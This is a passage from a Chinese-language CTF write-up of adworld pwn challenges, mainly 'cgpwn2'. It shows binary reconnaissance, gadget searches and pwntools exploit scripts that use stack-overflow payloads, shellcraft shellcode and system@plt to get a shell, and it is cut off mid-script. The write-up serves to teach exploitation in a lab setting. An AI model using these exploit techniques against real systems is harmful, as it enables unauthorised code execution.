</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>b</span><span class=sc>&#39;b&#39;</span><span class=o>*</span><span class=mi>4</span> <span class=err>#</span><span class=n>EBP</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=nf>p32</span><span class=p>(</span><span class=mh>0x08048694</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span><span class=n>b</span><span class=sc>&#39;c&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>260</span><span class=o>-</span><span class=mi>4</span><span class=o>-</span><span class=mh>0x14</span><span class=o>-</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;choice:&#34;</span><span class=p>,</span><span class=s>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;username:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=s>&#34;aa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;passwd:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h1 id=cgpwn2>cgpwn2</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>cgpwn2</span><span class=err>$</span> <span class=n>checksec</span> <span class=n>cgpwn2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vincebye</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>cgpwn2</span><span class=o>/</span><span class=n>cgpwn2</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nl>Arch</span><span class=p>:</span>     <span class=n>i386</span><span class=o>-</span><span class=mi>32</span><span class=o>-</span><span class=n>little</span>
</span></span><span class=line><span class=cl>    <span class=nl>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
</span></span><span class=line><span class=cl>    <span class=nl>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
</span></span><span class=line><span class=cl>    <span class=nl>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
</span></span><span class=line><span class=cl>    <span class=nl>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=nf>PIE</span> <span class=p>(</span><span class=mh>0x8048000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>cyclic</span> <span class=o>-</span><span class=n>l</span> <span class=n>axaa</span>
</span></span><span class=line><span class=cl><span class=mi>91</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mh>0x08048450</span><span class=p>]</span><span class=o>&gt;</span> <span class=n>ii</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Imports</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>nth</span> <span class=n>vaddr</span>      <span class=n>bind</span>   <span class=n>type</span>   <span class=n>lib</span> <span class=n>name</span>
</span></span><span class=line><span class=cl><span class=err>―――――――――――――――――――――――――――――――――――――</span>
</span></span><span class=line><span class=cl><span class=mi>1</span>   <span class=mh>0x080483e0</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>setbuf</span>
</span></span><span class=line><span class=cl><span class=mi>2</span>   <span class=mh>0x080483f0</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>gets</span>
</span></span><span class=line><span class=cl><span class=mi>3</span>   <span class=mh>0x08048400</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>fgets</span>
</span></span><span class=line><span class=cl><span class=mi>4</span>   <span class=mh>0x08048410</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=mi>5</span>   <span class=mh>0x08048420</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>system</span>
</span></span><span class=line><span class=cl><span class=mi>6</span>   <span class=mh>0x08048430</span> <span class=n>WEAK</span>   <span class=n>NOTYPE</span>     <span class=n>__gmon_start__</span>
</span></span><span class=line><span class=cl><span class=mi>7</span>   <span class=mh>0x08048440</span> <span class=n>GLOBAL</span> <span class=n>FUNC</span>       <span class=n>__libc_start_main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mh>0x08048450</span><span class=p>]</span><span class=o>&gt;</span> <span class=n>iz</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Strings</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>nth</span> <span class=n>paddr</span>      <span class=n>vaddr</span>      <span class=n>len</span> <span class=n>size</span> <span class=n>section</span> <span class=n>type</span>  <span class=n>string</span>
</span></span><span class=line><span class=cl><span class=err>―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span>
</span></span><span class=line><span class=cl><span class=mi>0</span>   <span class=mh>0x00000700</span> <span class=mh>0x08048700</span> <span class=mi>11</span>  <span class=mi>12</span>   <span class=p>.</span><span class=n>rodata</span> <span class=n>ascii</span> <span class=n>echo</span> <span class=n>hehehe</span>
</span></span><span class=line><span class=cl><span class=mi>1</span>   <span class=mh>0x0000070c</span> <span class=mh>0x0804870c</span> <span class=mi>24</span>  <span class=mi>25</span>   <span class=p>.</span><span class=n>rodata</span> <span class=n>ascii</span> <span class=n>please</span> <span class=n>tell</span> <span class=n>me</span> <span class=n>your</span> <span class=n>name</span>
</span></span><span class=line><span class=cl><span class=mi>2</span>   <span class=mh>0x00000728</span> <span class=mh>0x08048728</span> <span class=mi>38</span>  <span class=mi>39</span>   <span class=p>.</span><span class=n>rodata</span> <span class=n>ascii</span> <span class=n>hello</span><span class=p>,</span><span class=n>you</span> <span class=n>can</span> <span class=n>leave</span> <span class=n>some</span> <span class=n>message</span> <span class=nl>here</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=mi>3</span>   <span class=mh>0x0000074f</span> <span class=mh>0x0804874f</span> <span class=mi>9</span>   <span class=mi>10</span>   <span class=p>.</span><span class=n>rodata</span> <span class=n>ascii</span> <span class=n>thank</span> <span class=n>you</span>
</span></span></code></pre></div><h2 id=思路1写入cat-flag命令>思路1：写入cat flag命令</h2><p>溢出的偏移为91，有system函数，思路是写入cat flag，然后调用system函数，有一个问题是这个空格该如何处理？</p><p>找写入的地址</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>cgpwn2</span><span class=err>$</span> <span class=n>readelf</span> <span class=o>-</span><span class=n>S</span> <span class=n>cgpwn2</span> 
</span></span><span class=line><span class=cl><span class=n>There</span> <span class=n>are</span> <span class=mi>30</span> <span class=n>section</span> <span class=n>headers</span><span class=p>,</span> <span class=n>starting</span> <span class=n>at</span> <span class=n>offset</span> <span class=mh>0x1188</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Section</span> <span class=nl>Headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>Nr</span><span class=p>]</span> <span class=n>Name</span>              <span class=n>Type</span>            <span class=n>Addr</span>     <span class=n>Off</span>    <span class=n>Size</span>   <span class=n>ES</span> <span class=n>Flg</span> <span class=n>Lk</span> <span class=n>Inf</span> <span class=n>Al</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>0</span><span class=p>]</span>                   <span class=nb>NULL</span>            <span class=mo>00000000</span> <span class=mo>000000</span> <span class=mo>000000</span> <span class=mo>00</span>      <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>1</span><span class=p>]</span> <span class=p>.</span><span class=n>interp</span>           <span class=n>PROGBITS</span>        <span class=mi>08048154</span> <span class=mo>000154</span> <span class=mo>000013</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>2</span><span class=p>]</span> <span class=p>.</span><span class=n>note</span><span class=p>.</span><span class=n>ABI</span><span class=o>-</span><span class=n>tag</span>     <span class=n>NOTE</span>            <span class=mi>08048168</span> <span class=mo>00016</span><span class=mi>8</span> <span class=mo>000020</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>3</span><span class=p>]</span> <span class=p>.</span><span class=n>note</span><span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>build</span><span class=o>-</span><span class=n>i</span> <span class=n>NOTE</span>            <span class=mi>08048188</span> <span class=mo>0001</span><span class=mi>88</span> <span class=mo>000024</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>4</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>hash</span>         <span class=n>GNU_HASH</span>        <span class=mi>080481</span><span class=n>ac</span> <span class=mo>0001</span><span class=n>ac</span> <span class=mo>000030</span> <span class=mo>04</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>5</span><span class=p>]</span> <span class=p>.</span><span class=n>dynsym</span>           <span class=n>DYNSYM</span>          <span class=mi>080481</span><span class=n>dc</span> <span class=mo>0001</span><span class=n>dc</span> <span class=mo>0000</span><span class=n>c0</span> <span class=mi>10</span>   <span class=n>A</span>  <span class=mi>6</span>   <span class=mi>1</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>6</span><span class=p>]</span> <span class=p>.</span><span class=n>dynstr</span>           <span class=n>STRTAB</span>          <span class=mi>0804829</span><span class=n>c</span> <span class=mo>0002</span><span class=mi>9</span><span class=n>c</span> <span class=mo>000072</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>7</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>version</span>      <span class=n>VERSYM</span>          <span class=mi>0804830</span><span class=n>e</span> <span class=mo>00030</span><span class=n>e</span> <span class=mo>00001</span><span class=mi>8</span> <span class=mo>02</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>2</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>8</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>version_r</span>    <span class=n>VERNEED</span>         <span class=mi>08048328</span> <span class=mo>00032</span><span class=mi>8</span> <span class=mo>000020</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>6</span>   <span class=mi>1</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>9</span><span class=p>]</span> <span class=p>.</span><span class=n>rel</span><span class=p>.</span><span class=n>dyn</span>          <span class=n>REL</span>             <span class=mi>08048348</span> <span class=mo>00034</span><span class=mi>8</span> <span class=mo>000020</span> <span class=mi>08</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=p>.</span><span class=n>rel</span><span class=p>.</span><span class=n>plt</span>          <span class=n>REL</span>             <span class=mi>08048368</span> <span class=mo>00036</span><span class=mi>8</span> <span class=mo>00003</span><span class=mi>8</span> <span class=mi>08</span>   <span class=n>A</span>  <span class=mi>5</span>  <span class=mi>12</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=p>.</span><span class=n>init</span>             <span class=n>PROGBITS</span>        <span class=mi>080483</span><span class=n>a0</span> <span class=mo>0003</span><span class=n>a0</span> <span class=mo>000023</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=p>.</span><span class=n>plt</span>              <span class=n>PROGBITS</span>        <span class=mi>080483</span><span class=n>d0</span> <span class=mo>0003</span><span class=n>d0</span> <span class=mo>0000</span><span class=mi>80</span> <span class=mo>04</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=p>.</span><span class=n>text</span>             <span class=n>PROGBITS</span>        <span class=mi>08048450</span> <span class=mo>000450</span> <span class=mo>0002</span><span class=mi>92</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=p>.</span><span class=n>fini</span>             <span class=n>PROGBITS</span>        <span class=mf>080486e4</span> <span class=mf>0006e4</span> <span class=mo>000014</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=p>.</span><span class=n>rodata</span>           <span class=n>PROGBITS</span>        <span class=mf>080486f</span><span class=mi>8</span> <span class=mf>0006f</span><span class=mi>8</span> <span class=mo>000061</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=p>.</span><span class=n>eh_frame_hdr</span>     <span class=n>PROGBITS</span>        <span class=mi>0804875</span><span class=n>c</span> <span class=mo>00075</span><span class=n>c</span> <span class=mo>00003</span><span class=n>c</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=p>.</span><span class=n>eh_frame</span>         <span class=n>PROGBITS</span>        <span class=mi>08048798</span> <span class=mo>0007</span><span class=mi>98</span> <span class=mf>0000f</span><span class=mi>8</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=p>.</span><span class=n>init_array</span>       <span class=n>INIT_ARRAY</span>      <span class=mf>08049f</span><span class=mi>08</span> <span class=mf>000f</span><span class=mi>08</span> <span class=mo>000004</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=p>.</span><span class=n>fini_array</span>       <span class=n>FINI_ARRAY</span>      <span class=mf>08049f</span><span class=mi>0</span><span class=n>c</span> <span class=mf>000f</span><span class=mi>0</span><span class=n>c</span> <span class=mo>000004</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=p>.</span><span class=n>jcr</span>              <span class=n>PROGBITS</span>        <span class=mf>08049f</span><span class=mi>10</span> <span class=mf>000f</span><span class=mi>10</span> <span class=mo>000004</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=p>.</span><span class=n>dynamic</span>          <span class=n>DYNAMIC</span>         <span class=mf>08049f</span><span class=mi>14</span> <span class=mf>000f</span><span class=mi>14</span> <span class=mf>0000e8</span> <span class=mi>08</span>  <span class=n>WA</span>  <span class=mi>6</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=p>.</span><span class=n>got</span>              <span class=n>PROGBITS</span>        <span class=mf>08049ff</span><span class=n>c</span> <span class=mf>000ff</span><span class=n>c</span> <span class=mo>000004</span> <span class=mo>04</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=n>plt</span>          <span class=n>PROGBITS</span>        <span class=mi>0804</span><span class=n>a000</span> <span class=mo>001000</span> <span class=mo>00002</span><span class=mi>8</span> <span class=mo>04</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=p>.</span><span class=n>data</span>             <span class=n>PROGBITS</span>        <span class=mi>0804</span><span class=n>a028</span> <span class=mo>00102</span><span class=mi>8</span> <span class=mo>00000</span><span class=mi>8</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=p>.</span><span class=n>bss</span>              <span class=n>NOBITS</span>          <span class=mi>0804</span><span class=n>a040</span> <span class=mo>001030</span> <span class=mo>000074</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=p>.</span><span class=n>comment</span>          <span class=n>PROGBITS</span>        <span class=mo>00000000</span> <span class=mo>001030</span> <span class=mf>00004f</span> <span class=mo>01</span>  <span class=n>MS</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=p>.</span><span class=n>shstrtab</span>         <span class=n>STRTAB</span>          <span class=mo>00000000</span> <span class=mf>00107f</span> <span class=mo>000106</span> <span class=mo>00</span>      <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>28</span><span class=p>]</span> <span class=p>.</span><span class=n>symtab</span>           <span class=n>SYMTAB</span>          <span class=mo>00000000</span> <span class=mo>00163</span><span class=mi>8</span> <span class=mo>0004</span><span class=n>d0</span> <span class=mi>10</span>     <span class=mi>29</span>  <span class=mi>45</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>29</span><span class=p>]</span> <span class=p>.</span><span class=n>strtab</span>           <span class=n>STRTAB</span>          <span class=mo>00000000</span> <span class=mo>001</span><span class=n>b08</span> <span class=mo>0002</span><span class=n>da</span> <span class=mo>00</span>      <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>Key</span> <span class=n>to</span> <span class=nl>Flags</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nf>W</span> <span class=p>(</span><span class=n>write</span><span class=p>),</span> <span class=nf>A</span> <span class=p>(</span><span class=n>alloc</span><span class=p>),</span> <span class=nf>X</span> <span class=p>(</span><span class=n>execute</span><span class=p>),</span> <span class=nf>M</span> <span class=p>(</span><span class=n>merge</span><span class=p>),</span> <span class=nf>S</span> <span class=p>(</span><span class=n>strings</span><span class=p>),</span> <span class=nf>I</span> <span class=p>(</span><span class=n>info</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>L</span> <span class=p>(</span><span class=n>link</span> <span class=n>order</span><span class=p>),</span> <span class=nf>O</span> <span class=p>(</span><span class=n>extra</span> <span class=n>OS</span> <span class=n>processing</span> <span class=n>required</span><span class=p>),</span> <span class=nf>G</span> <span class=p>(</span><span class=n>group</span><span class=p>),</span> <span class=nf>T</span> <span class=p>(</span><span class=n>TLS</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>C</span> <span class=p>(</span><span class=n>compressed</span><span class=p>),</span> <span class=nf>x</span> <span class=p>(</span><span class=n>unknown</span><span class=p>),</span> <span class=nf>o</span> <span class=p>(</span><span class=n>OS</span> <span class=n>specific</span><span class=p>),</span> <span class=nf>E</span> <span class=p>(</span><span class=n>exclude</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>p</span> <span class=p>(</span><span class=n>processor</span> <span class=n>specific</span><span class=p>)</span>
</span></span></code></pre></div><p>选择</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=p>.</span><span class=n>bss</span>              <span class=n>NOBITS</span>          <span class=mi>0804</span><span class=n>a040</span> <span class=mo>001030</span> <span class=mo>000074</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>32</span>
</span></span></code></pre></div><p>寻找配合写入的gadgets</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>vincebye</span><span class=err>@</span><span class=nl>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld</span><span class=o>/</span><span class=n>cgpwn2</span><span class=err>$</span> <span class=n>ROPgadget</span> <span class=o>--</span><span class=n>binary</span> <span class=n>cgpwn2</span> <span class=o>--</span><span class=n>only</span> <span class=s>&#34;mov|pop|ret|xchg&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Gadgets</span> <span class=n>information</span>
</span></span><span class=line><span class=cl><span class=o>============================================================</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048517</span> <span class=o>:</span> <span class=n>mov</span> <span class=n>al</span><span class=p>,</span> <span class=n>byte</span> <span class=n>ptr</span> <span class=p>[</span><span class=mh>0xc9010804</span><span class=p>]</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048516</span> <span class=o>:</span> <span class=n>mov</span> <span class=n>al</span><span class=p>,</span> <span class=n>byte</span> <span class=n>ptr</span> <span class=nl>fs</span><span class=p>:[</span><span class=mh>0xc9010804</span><span class=p>]</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048480</span> <span class=o>:</span> <span class=n>mov</span> <span class=n>ebx</span><span class=p>,</span> <span class=n>dword</span> <span class=n>ptr</span> <span class=p>[</span><span class=n>esp</span><span class=p>]</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048602</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048600</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>ebx</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>esi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080486cc</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>ebx</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>esi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>edi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080483c1</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>ebx</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080486ce</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>edi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048601</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>esi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080486cd</span> <span class=o>:</span> <span class=n>pop</span> <span class=n>esi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>edi</span> <span class=p>;</span> <span class=n>pop</span> <span class=n>ebp</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080483aa</span> <span class=o>:</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl><span class=mh>0x080484ce</span> <span class=o>:</span> <span class=n>ret</span> <span class=mh>0xeac1</span>
</span></span><span class=line><span class=cl><span class=mh>0x08048813</span> <span class=o>:</span> <span class=n>xchg</span> <span class=n>eax</span><span class=p>,</span> <span class=n>edi</span> <span class=p>;</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Unique</span> <span class=n>gadgets</span> <span class=nl>found</span><span class=p>:</span> <span class=mi>13</span>
</span></span></code></pre></div><p>没有合适的gadgets，作罢</p><h2 id=思路2直接写入shellcode>思路2：直接写入shellcode</h2><p>直接写shellcode不就好了，笨蛋</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nf>process</span><span class=p>(</span><span class=s>&#34;./cgpwn2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp># p = remote(&#34;111.198.29.45&#34;,&#34;49404&#34;)
</span></span></span><span class=line><span class=cl><span class=cp>#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>context</span><span class=p>.</span><span class=n>binary</span> <span class=o>=</span> <span class=err>&#39;</span><span class=p>.</span><span class=o>/</span><span class=n>cgpwn2</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mi>91</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=k>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=p>.</span><span class=nf>sh</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>payload</span><span class=o>+</span><span class=n>shellcode</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;please tell me your name&#34;</span><span class=p>,</span> <span class=sc>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>sendlineafter</span><span class=p>(</span><span class=s>&#34;hello,you can leave some message here:&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>可是他有NX栈执行保护啊==,好了又放弃</p><h2 id=正确姿势>正确姿势</h2><p>=-=利用输入的name，将需要的字符串输入进去</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nf>process</span><span class=p>(</span><span class=s>&#34;./cgpwn2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=nf>ELF</span><span class=p>(</span><span class=s>&#34;cgpwn2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># p = remote(&#34;111.198.29.45&#34;,&#34;49404&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>system_addr</span><span class=o>=</span><span class=n>elf</span><span class=p>.</span><span class=n>plt</span><span class=p>[</span><span class=err>&#39;</span><span class=n>system</span><span class=err>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>bin_addr</span><span class=o>=</span><span class=mh>0x0804A080</span>
